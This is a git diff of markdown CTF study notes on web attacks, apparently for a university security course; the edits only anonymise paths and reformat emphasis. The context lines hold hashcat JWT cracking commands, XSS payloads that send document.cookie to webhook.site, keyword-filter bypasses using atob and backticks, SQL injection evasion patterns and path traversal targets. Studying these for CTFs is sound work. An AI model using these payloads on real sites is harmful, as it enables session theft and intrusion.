@@ -49,7 +49,7 @@ index.js
 # Decode - BruteForce
 ## wordlist
 ```sh
-cd /Users/xuyuzhu/Documents/xyz-kb/UNSW/6443/homework/topic2/wordlist
+cd /Users/Documents/wordlist
 ```
 
 
@@ -58,7 +58,7 @@ cd /Users/xuyuzhu/Documents/xyz-kb/UNSW/6443/homework/topic2/wordlist
 ```
 hashcat -m 16500 jwt.txt ../wordlist/xato-net-10-million-passwords.txt
 hashcat -m 16500 jwt.txt rockyou.txt
-hashcat -m 16500 jwt.txt /Users/xuyuzhu/Documents/xyz-kb/UNSW/6443/homework/topic2/wordlist/rockyou.txt
+hashcat -m 16500 jwt.txt /Users/wordlist/rockyou.txt
 ```
 
 ## Flask token
@@ -192,7 +192,7 @@ javascript:alert(1)
 
 ## 单引号拼接
 
-==fetch== 样例
+fetch 样例
 ```html
 fetch("https://webhook.site/<webhook id>?flag=" + btoa(document.cookie));
 
@@ -244,13 +244,13 @@ javascript:alert(1)
 
 
 ## 关键字拦截
-- 有`script` `fetch`==关键字拦截==时，用`img` `onerror` 事件
+- 有`script` `fetch` **关键字**拦截 时，用`img` `onerror` 事件
 ```
 <img src=x onerror="fetch('https://webhook.site/<webhook id>?flag='+document.cookie)"/>
 
 ```
 
-- 有==点号==、==引号==拦截 --- 用atob，以及`windows['']` 的方式取值
+- 有**点号**、**引号**拦截 --- 用atob，以及`windows['']` 的方式取值
 ```
 fetch(atob(`WEBHOOK_URL`) + document[`cookie`])
 ```
@@ -262,7 +262,7 @@ dcreat=<<script >ascript src="/clients.jsonp?q=1%26callback=fetch(atob(`aHR0cHM6
 - 没有**点号** `.` -------> 全部使用 **中括号** 访问属性，不怕点号过滤
 - 没有**引号** -------> 全部使用 **反引号**
 - 编码了 `&` -------> 使用 `%26` 确保 `callback` 参数不会被 POST 表单截断
-- 有 ==window== 字符串拦截 -------> **用atob**
+- 有 **window** 字符串拦截 -------> **用atob**
 
 ## markdown注入
 ```
@@ -536,7 +536,7 @@ column_name in ('flag' or 'flags')
 |                             |                                           |                                                           |
 | 大小写                         | UNION SELECT                              | UnIoN SeLeCt                                              |
 |                             | OR                                        | `Or` / `OorR`                                             |
-| 空格：用注释 `/**/` 替代<br>==经常考== | `union select`                            | ``union/**/select``                                       |
+| 空格：用注释 `/**/` 替代<br> **经常考** | `union select`                            | ``union/**/select``                                       |
 |                             | `UNION SELECT 1,2,3`                      | `UNION/**/SELECT/**/1,2,3`                                |
 |                             |                                           | `'/**/OR/**/'1'='1'/**/LIMIT/**/8,1#`                     |
 |                             | `OR 1=1`                                  | `OR/**/1=1`                                               |
@@ -710,13 +710,13 @@ WHERE username != 'admin'
 
 
 
- - `../`
+- `../`
 - `../../../../../../../../../../../../etc/passwd` -- great way t check for path traversal
 - `server.py`,`main.py`, app.py, app.js, index.js,
 - `/proc/self/environ` for secrets
 - `/proc/self/cwd` - for the current working directory
 - `/prod/self/cmdline` - for the current process's command
-- ==`/flag`, `/flag.txt`, `/getflag` - in CTF context==
+- `/flag`, `/flag.txt`, `/getflag` - in CTF context
 - `/var/nginx/www`  - for nginx / php static upload path: 
 - `/etc/apach2/httd.conf,` `/etc/nginx/nginx.conf`, `/etc/caddy/CaddyFile` --for web server config files
 
